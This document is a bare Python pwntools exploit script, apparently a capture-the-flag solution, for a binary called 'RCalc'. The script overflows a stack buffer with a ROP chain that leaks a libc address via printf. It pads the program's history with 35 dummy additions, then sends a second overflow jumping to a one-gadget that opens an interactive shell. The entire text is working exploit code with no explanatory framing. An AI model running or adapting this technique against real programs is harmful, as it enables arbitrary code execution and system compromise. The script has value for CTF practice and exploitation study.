from pwn import *
import time
p=process("./RCalc")
e=ELF("./RCalc")
libc=ELF("/libc64.so")
context.log_level='debug'
context.terminal=['tmux','splitw','-h']
p.recv()
prdi=0x401123
prsi_p=0x401121
payload='\x00'*0x118
payload+=p64(prdi)+p64(0x601FF0)+p64(e.plt['printf'])+p64(0x401036)
p.sendline(payload)
context.log_level='info'
def add(a,b):
    p.recvuntil(":")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(a))
    p.sendline(str(b))
    p.recvuntil("?")
    p.sendline("yes")
    p.recvuntil("?")

context.log_level='debug'
for i in range(35):
    add(0,0)

p.recvuntil(":")
#gdb.attach(p,"b*0x401035")
p.sendline("5")
libc.address=u64(p.recv(6)+"\x00\x00")-libc.symbols['__libc_start_main']

p.recv()
payload='\x00'*0x118+p64(libc.address+0xf1147)
p.sendline(payload)

context.log_level='info'
for i in range(35):
    add(0,0)
context.log_level='debug'

p.recvuntil(":")
#gdb.attach(p,"b*0x401035")
p.sendline("5")
print hex(libc.address)
p.interactive()
